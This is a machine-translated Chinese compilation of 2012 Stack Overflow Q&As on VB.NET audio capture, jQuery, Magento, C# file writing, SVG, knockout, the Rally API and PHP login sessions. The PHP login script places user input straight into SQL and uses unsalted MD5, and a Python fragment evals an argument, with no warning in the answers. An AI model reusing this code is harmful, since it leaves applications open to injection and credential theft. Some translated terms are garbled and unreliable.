        print('---Executing script. Enter optional arguments if you wish to use special API keys.---')
        setKey()
    else:
        setKey(eval(args[0]))

if __name__ == '__main__':
    import sys
    main(sys.argv[1:]) 
```

现在您可以`main()`使用不同的参数进行测试，而不必依赖将参数传递给您的测试脚本。

# directx - 将directdx转换为slimdx

> ID：13530881
> 
> 赞同：0
> 
> 时间：2012-11-23T14:17:12.983
> 
> 标签：directx, slimdx

嘿，我无法从 directx 转换为 slimdx。我的操作系统是windows 7 64位。这里是旧的directx 代码，它在下面不起作用：

```
Imports Microsoft.DirectX.DirectSound
Imports System.Threading
Imports System.Collections.Specialized

Public Class VU_Sound_Form

    Private Const SAMPLES As Integer = 8
    Private Shared SAMPLE_FORMAT_ARRAY As Integer() = {SAMPLES, 2, 1}
    Public Shared audioDevices As CaptureDevicesCollection
    Private Shared m_deviceNames As StringCollection

    Private deviceIndex As Integer = -1
    Private buffer As Microsoft.DirectX.DirectSound.CaptureBuffer
    Private liveVolumeThread As System.Threading.Thread
    Private m_frameDelay As Integer = 20
    Private Range_Division As Integer = 10

    'FrameDelay - the time in milliseconds between animation frames, measured in milliseconds. 
    'Values between 10 and 30 generally give good results, default is 20.

    Private Sub VU_Sound_Form_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
        Dim audioDevices As New CaptureDevicesCollection
        Dim x As Integer = 0
        MsgBox(audioDevices.Count.ToString())
        While x < audioDevices.Count
            ComboBox1.Items.Add(audioDevices.Item(x).Description)
            '  x = x + 1
        End While
        ComboBox1.SelectedIndex = 0
        Start()
    End Sub

    Private Sub ComboBox1_SelectedIndexChanged(ByVal sender As Object, ByVal e As System.EventArgs) Handles ComboBox1.SelectedIndexChanged
        Start()
    End Sub

    Public Sub Start()
        [Stop]()
        Dim audioDevices As New CaptureDevicesCollection
        deviceIndex = ComboBox1.SelectedIndex
        If deviceIndex <> -1 Then
            ' initialize the capture buffer and start the animation thread
            Dim cap As New Capture(audioDevices(deviceIndex).DriverGuid)
            Dim desc As New CaptureBufferDescription()
            Dim wf As New WaveFormat()
            wf.BitsPerSample = 16
            wf.SamplesPerSecond = 44100
            wf.Channels = 2
            wf.BlockAlign = CShort(wf.Channels * wf.BitsPerSample / 8)
            wf.AverageBytesPerSecond = wf.BlockAlign * wf.SamplesPerSecond
            wf.FormatTag = WaveFormatTag.Pcm

            desc.Format = wf
            desc.BufferBytes = SAMPLES * wf.BlockAlign

            buffer = New Microsoft.DirectX.DirectSound.CaptureBuffer(desc, cap)
            buffer.Start(True)

            ' Start a seperate thread to read the buffer and update the progress bars
            liveVolumeThread = New Thread(AddressOf updateProgress)  'Thread starts at updateProgress
            Control.CheckForIllegalCrossThreadCalls = False ' This is needed otherwise the form will not update
            liveVolumeThread.Priority = ThreadPriority.Lowest ' Thread works in the background
            liveVolumeThread.Start()

        End If
    End Sub

    Public Sub [Stop]()
        If liveVolumeThread IsNot Nothing Then
            liveVolumeThread.Abort()
            liveVolumeThread.Join()
            liveVolumeThread = Nothing
        End If

        If buffer IsNot Nothing Then
            If buffer.Capturing Then
                buffer.[Stop]()
            End If

            buffer.Dispose()
            buffer = Nothing
        End If
    End Sub

    Public Sub updateProgress()

        While True
            Dim tempFrameDelay As Integer = m_frameDelay
            Dim samples__1 As Array = buffer.Read(0, GetType(Int16), LockFlag.FromWriteCursor, SAMPLE_FORMAT_ARRAY)

            Dim leftGoal As Integer = 0
            Dim rightGoal As Integer = 0

            ' Convert the 8 samples to positive values and sum them togather 
            For i As Integer = 0 To SAMPLES - 1
                If CType(samples__1.GetValue(i, 0, 0), Int16) < 0 Then
                    leftGoal -= CType(samples__1.GetValue(i, 0, 0), Int16)
                Else
                    leftGoal += CType(samples__1.GetValue(i, 0, 0), Int16)
                End If
                If CType(samples__1.GetValue(i, 1, 0), Int16) < 0 Then
                    rightGoal -= CType(samples__1.GetValue(i, 1, 0), Int16)
                Else
                    rightGoal += CType(samples__1.GetValue(i, 1, 0), Int16)
                End If
            Next

            ' Calculate the average of the 8 samples
            leftGoal = CInt(Math.Abs(leftGoal \ SAMPLES))
            rightGoal = CInt(Math.Abs(rightGoal \ SAMPLES))

            ' Convert values to deecibels
            If leftGoal = 0 Then leftGoal = 1
            If rightGoal = 0 Then rightGoal = 1
            leftGoal = (100 + (20 * Math.Log10(leftGoal / 32768)))
            rightGoal = (100 + (20 * Math.Log10(rightGoal / 32768)))

            'By adding 100 sets the display range from 0 to 100 
            'By limiting the progreess bars to 74-100 gives a viewed range of +10dB to -26dB

            'Trap the range between 74-100, giving a 26dB meter
            If leftGoal < 74 Then leftGoal = 74
            If rightGoal < 74 Then rightGoal = 74 ' Set the display range to minimum -10dB
            If leftGoal > 100 Then leftGoal = 100
            If rightGoal > 100 Then rightGoal = 100

            Dim range1 As Double = leftGoal - ProgressBar1.Value ' calculates the difference between new and the current progress bar value 
            Dim range2 As Double = rightGoal - ProgressBar2.Value

            ' Assign the exact current value of the progress bar
            Dim exactValue1 As Double = ProgressBar1.Value
            Dim exactValue2 As Double = ProgressBar2.Value

            Dim stepSize1 As Double = range1 / Range_Division
            Dim absStepSize1 As Double = Math.Abs(stepSize1)

            Dim stepSize2 As Double = range2 / Range_Division
            Dim absStepSize2 As Double = Math.Abs(stepSize2)

            If ProgressBar1.Value < leftGoal Then    ' Display the peak
                ProgressBar1.Value = leftGoal
            End If

            If ProgressBar1.Value > leftGoal Then ' decrement the value by the Range_Division
                If absStepSize1 < Math.Abs(leftGoal - ProgressBar1.Value) Then
                    exactValue1 += stepSize1
                    ProgressBar1.Value = Math.Truncate(exactValue1)
                Else
                    ProgressBar1.Value = leftGoal
                End If
            End If

            If ProgressBar2.Value < rightGoal Then
                ProgressBar2.Value = rightGoal
            End If

            If ProgressBar2.Value > rightGoal Then ' decrement the value by the Range_Division
                If absStepSize2 < Math.Abs(rightGoal - ProgressBar2.Value) Then
                    exactValue2 += stepSize2
                    ProgressBar2.Value = Math.Truncate(exactValue2)
                Else
                    ProgressBar2.Value = rightGoal
                End If
            End If
            Thread.Sleep(m_frameDelay)
        End While
    End Sub

    Private Sub ProgressBar1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ProgressBar1.Click

    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click

    End Sub
End Class 
```

这里我的 slimdx 覆盖有以下错误：

```
Error   1   Overload resolution failed because no accessible 'New' accepts this number of arguments.    C:\Users\UltimateSoul\Documents\Visual Studio 2010\Projects\WindowsApplication3\WindowsApplication3\Form1.vb    43  17  WindowsApplication3

Error   2   'CaptureBuffer' is a type and cannot be used as an expression.  C:\Users\UltimateSoul\Documents\Visual Studio 2010\Projects\WindowsApplication3\WindowsApplication3\Form1.vb    56  22  WindowsApplication3

'Imports Microsoft.DirectX.DirectSound
Imports System.Threading
Imports System.Collections.Specialized
Imports SlimDX.DirectSound
Imports SlimDX.Multimedia

'Imports SlimDX.DirectSound

Public Class Form1

    Private Const SAMPLES As Integer = 8
    Private Shared SAMPLE_FORMAT_ARRAY As Integer() = {SAMPLES, 2, 1}
    Public Shared audioDevices As DeviceCollection
    Private Shared m_deviceNames As StringCollection

    Private deviceIndex As Integer = -1
    Private buffer As Microsoft.DirectX.DirectSound.CaptureBuffer
    Private liveVolumeThread As System.Threading.Thread
    Private m_frameDelay As Integer = 20
    Private Range_Division As Integer = 10

    'FrameDelay - the time in milliseconds between animation frames, measured in milliseconds. 
    'Values between 10 and 30 generally give good results, default is 20.

    Private Sub VU_Sound_Form_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load

    End Sub

    Private Sub ComboBox1_SelectedIndexChanged(ByVal sender As Object, ByVal e As System.EventArgs) Handles ComboBox1.SelectedIndexChanged
        Start()
    End Sub

    Public Sub Start()
        [Stop]()
        Dim audioDevices As New DeviceCollection
        deviceIndex = ComboBox1.SelectedIndex
        If deviceIndex <> -1 Then
            ' initialize the capture buffer and start the animation thread
            Dim cap As New CaptureBuffer(audioDevices(deviceIndex).DriverGuid)
            Dim desc As New CaptureBufferDescription()
            Dim wf As New WaveFormat()
            wf.BitsPerSample = 16
            wf.SamplesPerSecond = 44100
            wf.Channels = 2
            wf.BlockAlignment = CShort(wf.Channels * wf.BitsPerSample / 8)
            wf.AverageBytesPerSecond = wf.BlockAlignment * wf.SamplesPerSecond
            wf.FormatTag = WaveFormatTag.Pcm

            desc.Format = wf
            desc.BufferBytes = SAMPLES * wf.BlockAlignment

            buffer = CaptureBuffer(cap, desc)
            buffer.Start(True)

            ' Start a seperate thread to read the buffer and update the progress bars
            liveVolumeThread = New Thread(AddressOf updateProgress)  'Thread starts at updateProgress
            Control.CheckForIllegalCrossThreadCalls = False ' This is needed otherwise the form will not update
            liveVolumeThread.Priority = ThreadPriority.Lowest ' Thread works in the background
            liveVolumeThread.Start()

        End If
    End Sub

    Public Sub [Stop]()
        If liveVolumeThread IsNot Nothing Then
            liveVolumeThread.Abort()
            liveVolumeThread.Join()
            liveVolumeThread = Nothing
        End If

        If buffer IsNot Nothing Then
            If buffer.Capturing Then
                buffer.[Stop]()
            End If

            buffer.Dispose()
            buffer = Nothing
        End If
    End Sub

    Public Sub updateProgress()

        While True
            Dim tempFrameDelay As Integer = m_frameDelay
            Dim samples__1 As Array = buffer.Read(0, GetType(Int16), LockFlags.FromWriteCursor, SAMPLE_FORMAT_ARRAY)

            Dim leftGoal As Integer = 0
            Dim rightGoal As Integer = 0

            ' Convert the 8 samples to positive values and sum them togather 
            For i As Integer = 0 To SAMPLES - 1
                If CType(samples__1.GetValue(i, 0, 0), Int16) < 0 Then
                    leftGoal -= CType(samples__1.GetValue(i, 0, 0), Int16)
                Else
                    leftGoal += CType(samples__1.GetValue(i, 0, 0), Int16)
                End If
                If CType(samples__1.GetValue(i, 1, 0), Int16) < 0 Then
                    rightGoal -= CType(samples__1.GetValue(i, 1, 0), Int16)
                Else
                    rightGoal += CType(samples__1.GetValue(i, 1, 0), Int16)
                End If
            Next

            ' Calculate the average of the 8 samples
            leftGoal = CInt(Math.Abs(leftGoal \ SAMPLES))
            rightGoal = CInt(Math.Abs(rightGoal \ SAMPLES))

            ' Convert values to deecibels
            If leftGoal = 0 Then leftGoal = 1
            If rightGoal = 0 Then rightGoal = 1
            leftGoal = (100 + (20 * Math.Log10(leftGoal / 32768)))
            rightGoal = (100 + (20 * Math.Log10(rightGoal / 32768)))

            'By adding 100 sets the display range from 0 to 100 
            'By limiting the progreess bars to 74-100 gives a viewed range of +10dB to -26dB

            'Trap the range between 74-100, giving a 26dB meter
            If leftGoal < 74 Then leftGoal = 74
            If rightGoal < 74 Then rightGoal = 74 ' Set the display range to minimum -10dB
            If leftGoal > 100 Then leftGoal = 100
            If rightGoal > 100 Then rightGoal = 100

            Dim range1 As Double = leftGoal - ProgressBar1.Value ' calculates the difference between new and the current progress bar value 
            Dim range2 As Double = rightGoal - ProgressBar2.Value

            ' Assign the exact current value of the progress bar
            Dim exactValue1 As Double = ProgressBar1.Value
            Dim exactValue2 As Double = ProgressBar2.Value

            Dim stepSize1 As Double = range1 / Range_Division
            Dim absStepSize1 As Double = Math.Abs(stepSize1)

            Dim stepSize2 As Double = range2 / Range_Division
            Dim absStepSize2 As Double = Math.Abs(stepSize2)

            If ProgressBar1.Value < leftGoal Then    ' Display the peak
                ProgressBar1.Value = leftGoal
            End If

            If ProgressBar1.Value > leftGoal Then ' decrement the value by the Range_Division
                If absStepSize1 < Math.Abs(leftGoal - ProgressBar1.Value) Then
                    exactValue1 += stepSize1
                    ProgressBar1.Value = Math.Truncate(exactValue1)
                Else
                    ProgressBar1.Value = leftGoal
                End If
            End If

            If ProgressBar2.Value < rightGoal Then
                ProgressBar2.Value = rightGoal
            End If

            If ProgressBar2.Value > rightGoal Then ' decrement the value by the Range_Division
                If absStepSize2 < Math.Abs(rightGoal - ProgressBar2.Value) Then
                    exactValue2 += stepSize2
                    ProgressBar2.Value = Math.Truncate(exactValue2)
                Else
                    ProgressBar2.Value = rightGoal
                End If
            End If
            Thread.Sleep(m_frameDelay)
        End While
    End Sub

    Private Sub ProgressBar1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ProgressBar1.Click

    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Dim audioDevices As New DeviceCollection
        Dim x As Integer = 0
        MsgBox(audioDevices.Count.ToString())
        While x < audioDevices.Count
            ComboBox1.Items.Add(audioDevices.Item(x).Description)
            '  x = x + 1
        End While
        ComboBox1.SelectedIndex = 0
        Start()

    End Sub
End Class 
```

我想不出解决重载表达式的方法。请帮忙！如果您将directx 转换为slimdx，那就太酷了！

我对这两个图书馆都是新手。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T17:43:16.700

第一个错误与以下行有关`Start()`：

```
Dim cap As New CaptureBuffer(audioDevices(deviceIndex).DriverGuid) 
```

A`CaptureBuffer`不能从 guid 实例化。根据`audioDevices`你应该从这里选择一个相应的构造函数：[http ://slimdx.mdxinfo.com/latestdocs/Default.aspx?topic=Class+Reference/SlimDX.DirectSound+Namespace/CaptureBuffer+Class](http://slimdx.mdxinfo.com/latestdocs/Default.aspx?topic=Class+Reference/SlimDX.DirectSound+Namespace/CaptureBuffer+Class)

第二个错误与下面的一行有关：

```
buffer = CaptureBuffer(cap, desc) 
```

您可能只是忘记了`New`关键字。

# jquery - 如何将相同的函数绑定到不同的 jQuery 事件？

> ID：13530885
> 
> 赞同：1
> 
> 时间：2012-11-23T14:17:18.507
> 
> 标签：jquery, events, javascript-events

我想将一个启用按钮的函数绑定到事件`change`和`keypress`. 有没有比这更好的方法：

```
 $(':input').change(function () {
    onInputChange();
}).keypress(function () {
    onInputChange();
}); 
```

谢谢你。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-23T14:18:04.920

```
$(':input').on('change keypress', onInputChange); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-23T14:18:29.673

我相信这应该可以解决问题：

```
$(':input').on('change keypress', onInputChange); 
```

请注意，此代码假定`onInputChange`不担心`this`上下文或`event`变量，或者它考虑了它们。您可能还想使用以下内容：

```
$(':input').on('change keypress', function () {
    onInputChange();
}); 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-11-23T14:18:16.130

```
$(':input').on("change keypress", function () {
    onInputChange();
}); 
```

另外：您可以避免使用匿名函数，只需执行以下操作：

```
$(':input').on("change keypress", onInputChange); 
```

# magento - Magento - 从 xml 获取块属性值的更好方法

> ID：13530886
> 
> 赞同：1
> 
> 时间：2012-11-23T14:17:22.190
> 
> 标签：magento, magento-1.7

设置数据：

```
<block type="obishomeaddon/customcategory" name="customcategory" template="homeaddon/customcategory.phtml">
        <action method="setData"> <name>column_count</name> <value>4</value> </action>
        <action method="setData"> <name>category_id</name> <value>116</value> </action>
      </block> 
```

获取数据：

```
class Block extends Mage_Core_Block_Template {
   public getColumnCount() { 
     return $this->getData('column_count');
   }

   public getCategoryId() { 
     return $this->getData('category_id');
   }
} 
```

但我看到 Magento 可以做这样的事情：

```
<block type="obishomeaddon/customcategory" column_count="4" category_id="116" name="customcategory" template="homeaddon/customcategory.phtml"/> 
```

如何从这种设置数据中设置属性值？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T15:04:25.183

如果您查看`Mage_Core_Model_Layout->_generateBlock()`（负责生成块的类），您会发现这是不可能的。但是，添加它会非常简单。您可以`Mage_Core_Model_Layout->_generateBlock()`像这样覆盖：

在您的`config.xml`文件中：

```
<models>
    <core>
        <rewrite>
            <layout>Namespace_Module_Model_Core_Layout</layout>
        </rewrite>
    </core>
</models> 
```

然后，在您的文件中：

```
<?php

class Namespace_Module_Model_Core_Layout extends Mage_Core_Model_Layout
{
    protected function _generateBlock($node, $parent)
    {
        parent::_generateBlock($node, $parent);
        //   Since we don't want to rewrite the entire code block for 
        //   future upgradeability, we will find the block ourselves.

        $blockName = $node['name'];

        $block = $this->getBlock($blockName);
        if ($block instanceof Mage_Core_Model_Block_Abstract) {

            // We could just do $block->addData($node), but the following is a bit safer
            foreach ($node as $attributeName => $attributeValue) {
                if (!$block->getData($attributeName)) {
                    // just to make sure that we aren't doing any damage here.                    
                    $block->addData($attributeName, $attributeValue);
                }
            }
        }
    }
} 
```

您可以在不重写的情况下缩短 XML 的另一件事是：

```
<block type="obishomeaddon/customcategory" name="customcategory" template="homeaddon/customcategory.phtml">
    <action method="addData"><data><column_count>4</column_count> <category_id>116</category_id></data></action>
</block> 
```

# c# - 将时间选择器和复选框保存到文本文件

> ID：13530889
> 
> 赞同：0
> 
> 时间：2012-11-23T14:17:29.130
> 
> 标签：c#, file, timepicker

嗨，我是 c# 的新手，我正在尝试将 12 个复选框保存到以所选日期命名的 TEXT 文件中。

我有要输出的复选框，但似乎没有以日期命名的文件。我似乎也在这方面走了很长一段路。如果任何机构现在有任何更短的路线或我出错的地方，那就太好了。

```
 public void timepicker_ValueChanged(object sender, EventArgs e)
    {
        string date = timepicker.Value.ToString("dd-MM-yyyy");           
    }

    string amorpm = "";

    if (rb_am.Checked) 
    {
       am = rb_am.Text;
    }
    else if (rb_pm.Checked) 
    {
       pm = rb_pm.Text;
    }

    SteamWriter am = File.CreateText("seats_file.txt");
    am.WriteLine ("am morning run");
    am.close;

    SteamWrite pm = File.CreateText("seats_file.txt");
    pm.WriteLne ("pm afternoon nrun");
    pm.Close;

    public void btn_saveseats_Click(object sender, EventArgs e)
    {
        {
           String date = timepicker.Value.ToString("dd-mm-yyyy");
          //String fileName = String.Format("{0}File.txt", date);

        try

            if (File.Exists(date))

            {
               (MessageBox.Show("Warning: file already exists. Contents will be replaced - do you want to continue?", "File Demo", MessageBoxButtons.YesNo, MessageBoxIcon.Question,
                     MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly) == DialogResult.Yes)
                {

                    //write lines of text to file

                    StreamWriter date = File.CreateText(date);
                    date.WriteLine(date);
                    date.Close();

                    if (cbseat1.Checked)
                    {
                        // Do something when CheckBox is checked
                        StreamWriter seat1 = File.CreateText("seats_file.txt");
                        seat1.WriteLine("seat 1 taken");
                        seat1.Close();
                    }

                    if (cbseat2.Checked)
                    {
                        // Do something when CheckBox is checked
                        StreamWriter seat2 = File.AppendText("seats_file.txt");
                        seat2.WriteLine("seat 2 taken.Text");
                        seat2.Close();
                    }

                    if (cbseat3.Checked)
                    {
                        // Do something when CheckBox is checked
                        StreamWriter seat3 = File.AppendText("seats_file.txt");
                        seat3.WriteLine("seat 3 taken");
                        seat3.Close();
                    }

                    if (cbseat4.Checked)
                    {
                        // Do something when CheckBox is checked
                        StreamWriter seat4 = File.AppendText("seats_file.txt");
                        seat4.WriteLine("seat 4 taken");
                        seat4.Close();
                    }

                    if (cbseat5.Checked)
                    {
                        // Do something when CheckBox is checked
                        StreamWriter seat5 = File.AppendText("seats_file.txt");
                        seat5.WriteLine("seat 5 taken");
                        seat5.Close();
                    }

                    if (cbseat6.Checked)
                    {
                        // Do something when CheckBox is checked
                        StreamWriter seat6 = File.AppendText("seats_file.txt");
                        seat6.WriteLine("seat 6 taken");
                        seat6.Close();
                    }

                    if (cbseat7.Checked)
                    {
                        // Do something when CheckBox is checked
                        StreamWriter seat7 = File.AppendText("seats_file.txt");
                        seat7.WriteLine("seat 7 taken");
                        seat7.Close();
                    }

                    if (cbseat8.Checked)
                    {
                        // Do something when CheckBox is checked
                        StreamWriter seat8 = File.AppendText("seats_file.txt");
                        seat8.WriteLine("seat 8 taken");
                        seat8.Close();
                    }

                    if (cbseat9.Checked)
                    {
                        // Do something when CheckBox is checked
                        StreamWriter seat9 = File.AppendText("seats_file.txt");
                        seat9.WriteLine("seat 9 taken");
                        seat9.Close();
                    }

                    if (cbseat10.Checked)
                    {
                        // Do something when CheckBox is checked
                        StreamWriter seat10 = File.AppendText("seats_file.txt");
                        seat10.WriteLine("seat 10 taken");
                        seat10.Close();
                    }

                    if (cbseat11.Checked)
                    {
                        // Do something when CheckBox is checked
                        StreamWriter seat11 = File.AppendText("seats_file.txt");
                        seat11.WriteLine("seat 11 taken");
                        seat11.Close();
                    }

                    if (cbseat12.Checked)
                    {
                        // Do something when CheckBox is checked
                        StreamWriter seat12 = File.AppendText("seats_file.txt");
                        seat12.WriteLine("seat 12 taken");
                        seat12.Close();
                    }

                    MessageBox.Show("saved");

                }
            }
        }
    }
} 
```

}

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T16:05:30.650

是的，你走错了方向，需要重写你的代码，这里有更好的代码版本：

```
public void btn_saveseats_Click(object sender, EventArgs e){

    String date = timepicker.Value.ToString("dd-mm-yyyy");
    String fileName = String.Format("{0}File.txt", date);

    using (StreamWriter writer = new StreamWriter(fileName)){
        writer.WriteLine(date);
        if(cbseat1.Checked)
            writer.WriteLine(cbseat1.Text);
        if(cbseat2.Checked)
            writer.WriteLine(cbseat2.Text);
        if(cbseat3.Checked)
            writer.WriteLine(cbseat3.Text);
        if(cbseat4.Checked)
            writer.WriteLine(cbseat4.Text);
        if(cbseat5.Checked)
            writer.WriteLine(cbseat5.Text);
        if(cbseat6.Checked)
            writer.WriteLine(cbseat6.Text);
        if(cbseat7.Checked)
            writer.WriteLine(cbseat7.Text);
        if(cbseat8.Checked)
            writer.WriteLine(cbseat8.Text);
        if(cbseat9.Checked)
            writer.WriteLine(cbseat9.Text);
        if(cbseat10.Checked)
            writer.WriteLine(cbseat10.Text);
        if(cbseat11.Checked)
            writer.WriteLine(cbseat11.Text);
        if(cbseat12.Checked)
            writer.WriteLine(cbseat12.Text);
    }
    MessageBox.Show("saved");
} 
```

例如，我编写了可以用任何其他字符串替换的复选框*文本。*
该`using`块在写入文件后处理实例，因此您无需显式调用`writer.Dispose();`.

***更好的方法：***

将您的复选框包装在任何容器控件（如*Panel*或*GroupBox* ）中，然后使用其*Controls*属性枚举其子控件，检查其类型是否为`Checkbox`，如果是则检查它是否被选中。`this.Controls`如果您的复选框是*Form*的直接子级，则可以使用：

```
foreach(Control ctrl in pnl.Controls){
    if(ctrl is Checkbox){
        Checkbox chk = ctrl as Checkbox;
        if(chk.Checked){
            switch(chk.Name){
                case "chkSeat1":
                    writer.WriteLine(chk.Text);
                    break;
                case "chkSeat2":
                    writer.WriteLine(chk.Text);
                    break;
                case "chkSeat3":
                    writer.WriteLine(chk.Text);
                    break;

                ...
            }
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T15:58:50.147

一些可以帮助您更快完成繁重工作的东西：

```
 public void WriteCBValuesToFile()
    {
        foreach (Control control in this.Controls) // 'this' is the form... In your case it might be a groupBox, panel, etc.
        {
            if (control is CheckBox)
            {
                CheckBox cb = (CheckBox)control;

                if (cb.Name == "Whatever")
                { 
                    //Whatever...
                }
            }
        }
    } 
```

# html - Chrome SVG 动画标签

> ID：13530894
> 
> 赞同：2
> 
> 时间：2012-11-23T14:17:56.933
> 
> 标签：html, google-chrome, svg, svg-animate

有人可以告诉我为什么这段代码：

```
<!DOCTYPE html>
<html>
<body>
<svg xmlns="http://www.w3.org/2000/svg" width="800" height="800">

    <defs id="defs">
            <animate xlink:href="#poly_t1" attributeName="points" attributeType="XML" from="100,500 150,500 170,480 120,480" to="100,400 150,400 170,380 120,380" begin="0s" dur="3s" fill="freeze" ></animate>
            <animate xlink:href="#poly_t2" attributeName="points" attributeType="XML" from="100,500 150,500 150,500 100,500" to="100,500 150,500 150,400 100,400" begin="0s" dur="3s" fill="freeze" ></animate>
            <animate xlink:href="#poly_t3" attributeName="points" attributeType="XML" from="150,500 170,480 170,480 150,500" to="150,500 170,480 170,380 150,400" begin="0s" dur="3s" fill="freeze" ></animate>

    </defs>
    <g id="histo">
            <polygon id="poly_t1" points="100,500 150,500 170,480 120,480" fill="#cc0022" stroke="black"></polygon>
            <polygon id="poly_t2" points="100,500 150,500 150,500 100,500" fill="#cc0022" stroke="black" ></polygon>
            <polygon id="poly_t3" points="150,500 170,480 170,480 150,500" fill="#cc0022" stroke="black"></polygon>
    </g>

</svg>
</body>
</html> 
```

[http://jsfiddle.net/j2spu/2/](http://jsfiddle.net/j2spu/2/)

我认为适用于 FF、Chrome 18 至 19、Safari、rekonq 等，但不适用于 Chrome 20 至 24？

# recommendation-engine - SVD和SVM有什么区别

> ID：13530895
> 
> 赞同：6
> 
> 时间：2012-11-23T14:17:59.730
> 
> 标签：recommendation-engine, svm, svd

我知道缩写`SVM(Support Vector Machines)`，`SVD(Singular Value Decomposition)`并且 SVM、SVD 都用于推荐引擎。

用外行的话来说，这两种算法有什么区别，它们将如何影响我的推荐引擎。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-24T10:41:19.957

SVD 和 SVM 解决不同的问题，无论它们在内部如何工作。

SVD 是一种降维技术，它基本上可以使您的数据更加密集。在一般机器学习中，SVD 经常被用作预处理步骤。在推荐中，有许多类似于 SVD 的矩阵/张量分解技术，但通常针对不同的目标函数进行优化，例如，它们包含正则化项以防止过度拟合（以便更好地从训练数据泛化到实际预测）。它们通常被称为 SVD 或在其名称中包含“SVD”，但它们并不是数学家所理解的 SVD。

SVM 是一种分类器。在推荐系统中，您可以使用 SVM 为每个用户（或用户组）训练一个分类器，该分类器根据产品的属性确定用户是否会购买该产品。当然，您也可以为该任务使用其他分类器，例如朴素贝叶斯、逻辑回归或决策树。

# javascript - knockoutJS $index 无法正常工作

> ID：13530900
> 
> 赞同：0
> 
> 时间：2012-11-23T14:18:14.940
> 
> 标签：javascript, knockout.js

**JS**

```
 function NotificationsViewModel()
    {
        this.months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov','Dec'];
        this.activeMonth = ko.observable(10);
    }

ko.applyBindings(new NotificationsViewModel()); 
```

**HTML**

```
<ul data-bind="foreach: months">
    <li data-bind="css:{'selected-month': $index == $root.activeMonth()}">
        <span data-bind="text: $index"></span> : <span data-bind="text: $data"></span>
    </li>
</ul>​ 
```

[http://jsfiddle.net/fhZph/](http://jsfiddle.net/fhZph/1/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T14:23:03.377

你应该解开`$index`价值：

```
<ul data-bind="foreach: months">
    <li data-bind="css:{'selected-month': $index() == $root.activeMonth()}">
        <span data-bind="text: $index"></span> : <span data-bind="text: $data"></span>
    </li>
</ul>​ 
```

# .net - RallyRestApi 无法从分层要求解析对象引用

> ID：13530903
> 
> 赞同：2
> 
> 时间：2012-11-23T14:18:18.793
> 
> 标签：.net, rest, task, rally

我正在使用`Rally.RestApi.dll`创建一组针对用户故事（美国）的任务。美国已经存在于集会中，因此我想针对此创建一组模板任务。

使用以下代码，我收到一条错误消息“ `Cannot parse object reference from /hierarchicalrequirement/[Parent ID]`”

```
RallyRestApi rallyRestApi = new RallyRestApi("<username>", "<password>", "https://rally1.rallydev.com", "1.39");
DynamicJsonObject jsonObject = new DynamicJsonObject();
jsonObject["Name"] = "Dev Task";
jsonObject["WorkProduct"] = "/hierarchicalrequirement/US1234";
jsonObject["Estimate"] = 10;
jsonObject["ToDo"] = 10;
jsonObject["TaskType"] = "Dev";
jsonObject["Team"] = "QA";
CreateResult createResult = rallyRestApi.Create("task", jsonObject); 
```

所以问题是，如何在拉力赛中创建子项（任务）并将其与父项（美国）相关联？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T20:35:29.787

你在正确的轨道上。您只需要使用故事的 ObjectID 而不是它的 FormattedID：

```
jsonObject["WorkProduct"] = "/hierarchicalrequirement/1412304834"; //object id 
```

# php - 如何在登录脚本中使用会话

> ID：13530904
> 
> 赞同：3
> 
> 时间：2012-11-23T14:18:21.350
> 
> 标签：php, mysql, sql, session

我有三个文件

*   索引.php
*   登录.php
*   授权文件

我的登录表单基于我的 index.php。我在索引页面上包括 login.php。

我想要它，所以当我登录时，它将由 auth.php （确实如此）进行身份验证，并且将在 auth.php 上显示一条消息，上面写着“您的登录成功”（确实如此），但是，当它回到索引页面，它提供了登录表单，而不是说“欢迎用户，您已成功登录。

我相信错误来自会话主要是因为我不知道还有什么可能是错误的。

这是我的每一页的代码。

索引.php：

```
<?php include ("login.php"); ?> 
```

登录.php

```
<?php
if ($loggedin){
    echo '<h2>Logged in</h2><p style="font-size:14px;">Welcome '.$user.' you have sucessfully logged in.</p>';
}
else {
     echo '
       <h2>Login</h2>
       <form action="auth.php" method="POST">
       <div class="smallform">
                <p><span>Username:</span><br>
                <input type="text" name="user"></p>
                <p><span>Password:</span><br>
                <input type="password" name="pass"></p>
                <p style="padding-top: 15px"><input type="submit" value="Submit"></p>
        </div>
        </form>';
}
?> 
```

认证.php：

```
<?php
session_start();
$con = mysqli_connect("HoST", "USER", "PASS", "DBNAME");
$user = $_POST["user"];
$pass = $_POST["pass"];
$sql = "SELECT UserID FROM Customer 
        WHERE UserID = \"$user\"
        AND Password = md5(\"$pass\")";

$res = mysqli_query($con, $sql);
?>
<!DOCTYPE>
<html>

<head>
<title>VeloCity</title>
<link href="_stylesheet.css" rel="stylesheet" type="text/css" />
<?php echo '<meta http-equiv="refresh" content="1;URL=index.php" />'; ?>
</head>

<body>
<div align="center">
<?php 
if(mysqli_num_rows($res)==1){
    $_SESSION["user"] = $user;
    echo "You have sucessfully logged in";
}
else{
    echo "You have entered an incorrect password. Please try again";
}
?>
</div>
</body>
</html> 
```

真的很感激一些帮助！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T14:31:31.680

对于会话，最好将 session_start(); 就在页面的最顶部。第 1 行，因为这避免了会话设置错误。

在您希望限制访问的每个页面上，您都需要应用 session_start(); 在每一页上。

